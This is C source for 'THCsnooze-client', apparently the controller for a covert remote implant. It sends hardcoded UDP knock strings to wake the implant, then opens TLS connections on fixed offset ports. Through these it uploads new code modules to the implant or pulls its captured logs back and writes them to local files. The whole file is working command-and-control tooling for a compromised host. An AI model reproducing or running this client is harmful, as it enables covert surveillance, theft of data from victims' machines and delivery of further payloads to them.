#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <main.h>
#include <misc.h>
#include <ssl.h>
#include <minsock.h>

#define PROGRAM	"THCsnooze-client"
#define AUTHOR	"THC"

#define L_NEW_MOD	"asdasdasdasdasdasdasdasdasdasdas"
#define L_GET_LOG	"asasdasdasdasdasdasdasdasdasdasd"

#define	MSG_GET_LOG	1
#define	MSG_NEW_MOD	2

char           *server = NULL;
unsigned int    port;

int
get_port(int w)
{

    int             ret = 0;

    switch (w) {
    case MSG_GET_LOG:
	ret = port + 2;
	break;
    case MSG_NEW_MOD:
	ret = port + 1;
	break;
    }
    return ret;

}

void
send_udp_message(int w)
{
    int             sock, nlen = sizeof(struct sockaddr_in);
    struct sockaddr_in sin;


    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(server);

    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
	die("socket");

    if (connect(sock, (struct sockaddr *) & sin, nlen) != 0)
	die("connect");

    switch (w) {
    case MSG_NEW_MOD:
	if (write(sock, L_NEW_MOD, 32) != 32)
	    die("write: send_udp_message failed.");
	break;
    case MSG_GET_LOG:
	if (write(sock, L_GET_LOG, 32) != 32)
	    die("write: send_udp_message failed.");
	break;
    }

    close(sock);
}


void
usage(char *s)
{
    printf("Usage: %s [Options] <server> <port>\n", s);
    printf("Options:\n");
    printf("\t-k <key>:\t load private key from file key.\n");
    printf("\t-c <cert>:\t load coresponding certificate from file cert.\n");
    printf("\t-l:\t\t get logs.\n");
    printf("\t-m <file>:\t send module from file to server.\n");
    printf("\n");
    exit(0);
}


int
read_line(SSL * f, char *buf, int len)
{
    char            b[2];
    int             x = 0, y;

    while (len) {
	y = SSL_read(f, b, 1);

	if (y == 0)
	    return x;

	if (y == -1)
	    return -1;

	if (b[0] == '\n')
	    return x;

	buf[x++] = b[0];
    }

    return x;
}


int
main(int argc, char **argv)
{
    int             x = 1, y, z, f, get_log = 0, sock, send_mod = 0;
    char            buf[8192], buf2[128], *b_ptr = NULL, *mod = NULL, *key = NULL, *cert = NULL;
    FILE           *fd = NULL;
    ssl_t          *ssl;

    printf(PROGRAM "-" VERSION " by " AUTHOR "\n");

    ssl_init();

    if (argc < 3)
	usage(argv[0]);

    while (x < argc - 2) {
	if (argv[x][0] == '-') {
	    switch (argv[x][1]) {
	    case 'c':
		cert = argv[++x];
		break;
	    case 'k':
		key = argv[++x];
		break;
	    case 'm':
		send_mod = 1;
		mod = argv[++x];
		break;
	    case 'l':
		get_log = 1;
		break;
	    case 'h':
	    default:
		usage(argv[0]);
		break;
	    }
	} else {
	    usage(argv[0]);
	}
	++x;
    }

    if (!get_log && !send_mod)
	usage(argv[0]);

    port = atoi(argv[argc - 1]);
    server = argv[argc - 2];

    if (send_mod) {
	if ((fd = fopen(mod, "r")) == NULL)
	    die("fopen");

	send_udp_message(MSG_NEW_MOD);
	sleep(1);

	if ((sock = sck_connect_tcp(server, get_port(MSG_NEW_MOD))) == -1)
	    die("connect_tcp");

	if ((ssl = ssl_do_accept(sock, key, cert)) == NULL)
	    die("ssl");

	printf("connected. sending file ...\n");
	while (!feof(fd)) {
	    f = fread(buf, 1, sizeof(buf), fd);

	    if (SSL_write(ssl->ssl, buf, f) != f)
		die("SSL_write");
	}
	printf("done.\n");
	SSL_shutdown(ssl->ssl);
	ssl_free(ssl);
	sck_close(sock);
	fclose(fd);
    }
    if (get_log) {
	send_udp_message(MSG_GET_LOG);
	sleep(1);

	if ((sock = sck_connect_tcp(server, get_port(MSG_GET_LOG))) == -1)
	    die("connect_tcp");

	if ((ssl = ssl_do_accept(sock, key, cert)) == NULL)
	    die("ssl");

	printf("connected. fetching logs\n");
	while (read_line(ssl->ssl, buf, sizeof(buf)) > 4) {
	    if ((b_ptr = strtok(buf, ":")) == NULL)
		die("strtok");

	    z = 0;
	    do {
		if (snprintf(buf2, sizeof(buf2), "%s_%04x", \
			     b_ptr, z) == -1) {
		    die("snprintf");
		}
		++z;
	    } while (file_exists(buf2));

	    if ((b_ptr = strtok(NULL, ":")) == NULL)
		die("strtok");

	    y = atoi(b_ptr);

	    if ((fd = fopen(buf2, "w")) == NULL)
		die("fopen");

	    while (y > 0) {
		if (y < sizeof(buf))
		    z = SSL_read(ssl->ssl, buf, y);
		else
		    z = SSL_read(ssl->ssl, buf, sizeof(buf));

		if (z < 0)
		    die("SSL_read");

		fwrite(buf, 1, z, fd);
		y -= z;
	    }
	    fclose(fd);
	    printf(".");
	    fflush(stdout);
	}
	printf("done.\n");

	SSL_shutdown(ssl->ssl);
	ssl_free(ssl);
	close(sock);
    }
    return 0;
}
